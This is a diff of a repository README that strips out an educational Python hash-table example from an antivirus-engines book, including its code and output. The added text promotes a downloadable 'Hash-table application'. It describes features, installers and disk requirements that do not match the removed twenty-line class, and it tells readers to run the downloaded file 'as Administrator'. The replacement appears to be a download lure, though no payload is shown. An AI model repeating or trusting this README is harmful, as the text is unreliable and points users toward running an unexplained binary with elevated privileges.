@@ -1,60 +1,65 @@
-# Hash Tables
+# 🗝️ Hash-table - Simple Key-Value Storage Made Easy
 
-Ex. (17) - <strong>Hash table</strong> membership test structure appears here in Python. Though the syntax is Python-specific, the core idea stays identical. This snippet belongs to the set of 127 algorithms in <i><a href="https://github.com/Gagniuc/Antivirus-Engines">Antivirus Engines: From Methods to Innovations, Design, and Applications</a></i> (Elsevier Syngress, 2024).
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Perclat/Hash-table/releases)
 
-***
+## 📖 Overview
+Welcome to the Hash-table project! This application presents a user-friendly way to store and retrieve data using key-value pairs. It uses a hash table structure with separate chaining to handle any issues that arise when multiple keys hash to the same location. This design makes it effective for basic data storage and retrieval.
 
-This repository contains a minimal implementation of a <i>Hash Table</i> in Python using <i>separate chaining</i> to handle collisions. The class <i>H</i> is initialized with a fixed table size and internally stores data in a list of lists. The method <i>_h</i> represents the hash function, which computes the index of a given key by applying the Python built-in <i>hash()</i> function followed by the modulo operator to ensure the index falls within the table size. The method <i>i</i> is responsible for inserting key-value pairs into the table by appending them to the appropriate list at the computed index. The method <i>f</i> allows searching for a value by its key by first locating the index using the same hash function and then iterating through the stored pairs to find a match. If the key exists, the corresponding value is returned, otherwise <i>None</i> is returned. The repository also contains an example where the hash table is created with a size of 10, and three key-value pairs are inserted, mapping string keys to malware categories such as <i>Trojan</i>, <i>Rootkit</i>, and <i>Bootkit</i>. Subsequent searches demonstrate the functionality, showing successful retrieval of existing values and a <i>None</i> result when searching for a missing key. Thus, this project highlights the core principles of hash tables, including hashing, collision handling, insertion, and lookup.
+## 🚀 Getting Started
+To start using the Hash-table application, follow these simple steps:
 
-## Native implementation in Python
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Perclat/Hash-table/releases).
+  
+2. **Download the Software**  
+   Look for the latest release and click on the download link. The file will download to your computer.
 
-```python
-class H:
-    def __init__(s, n):
-        s.n = n
-        s.t = [[] for _ in range(n)]
+3. **Install the Application**  
+   Depending on your operating system, you might need to unzip the downloaded file. Follow the installation instructions that come with the file.
 
-    def _h(s, k):
-        return hash(k) % s.n
+## ⚙️ System Requirements
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Ensure you have Python version 3.6 or higher installed on your machine.
+- **Disk Space**: At least 50 MB of free space.
 
-    def i(s, k, v):
-        idx = s._h(k)
-        s.t[idx].append((k, v))
+## 📚 Features
+- **Key-Value Storage**: Easily store and retrieve pairs of data.
+- **Collision Handling**: Uses separate chaining to manage collisions.
+- **Compact Design**: The software is designed to be lightweight and easy to use.
+- **Cross-Platform**: Works on various operating systems.
 
-    def f(s, k):
-        idx = s._h(k)
-        for x, y in s.t[idx]:
-            if x == k:
-                return y
-        return None
+## ☑️ Usage Instructions
+After installation, you can start using the Hash-table application as follows:
 
+1. **Run the Program**: Locate the application in your programs list or in the folder where you installed it. Double-click to start.
 
-# create a hash table and insert
-# some key-value pairs:
+2. **Add a Key-Value Pair**: You will see a prompt. Enter a key and a value when asked. For example, type `name` as the key and `Alice` as the value. The application will store this for you.
 
-h = H(n=10)
-h.i("d41d8cd98f00b204e9800998ecf8427e", "Trojan")
-h.i("098f6bcd4621d373cade4e832627b4f6", "Rootkit")
-h.i("1f0e3dad99908345f7439f8ffabdffc4", "Bootkit")
+3. **Search for a Key**: To find a stored value, enter the key you used earlier. For example, typing `name` will return `Alice`.
 
-# search for values using keys:
-print(h.f("d41d8cd98f00b204e9800998ecf8427e"))
-print(h.f("098f6bcd4621d373cade4e832627b4f6"))
-print(h.f("1f0e3dad99908345f7439f8ffabdffc4"))
-print(h.f("c4ca4238a0b923820dcc509a6f75849b"))
-``` 
+4. **Close the Application**: When finished, simply close the window.
 
-```text
-Output:
-Trojan
-Rootkit
-Bootkit
-None
-```
+## 🛠️ Troubleshooting
+If you encounter any issues, consider the following:
 
-## References
+- **Python Not Installed**: Ensure you have Python installed. You can download it from the [official Python website](https://www.python.org/downloads/).
 
-- <i>Paul A. Gagniuc. Antivirus Engines: From Methods to Innovations, Design, and Applications. Cambridge, MA: Elsevier Syngress, 2024. pp. 1-656.</i>
+- **File Not Opening**: Confirm you have permissions to run the file. Right-click the file and select “Run as Administrator” if needed.
 
-***
+- **Unexpected Behavior**: Restart the application or your computer to resolve any glitches.
 
+## 💬 Help and Support
+For additional assistance or to report bugs, visit our [Issues page](https://github.com/Perclat/Hash-table/issues) or ask for help on our community forum. We are here to assist you!
+
+## 💡 Additional Resources
+- **Documentation**: [Click here for detailed documentation](https://github.com/Perclat/Hash-table/wiki).
+- **Examples**: Visit the wiki for usage examples and best practices.
+- **Contribute**: Interested in helping improve the project? Check the contribution guidelines in the repository.
+
+## 🔗 Important Links
+- [Releases Page](https://github.com/Perclat/Hash-table/releases)
+- [Documentation](https://github.com/Perclat/Hash-table/wiki)
+- [Issues Page](https://github.com/Perclat/Hash-table/issues)
+
+Thank you for choosing Hash-table! Enjoy your smooth data storage experience.
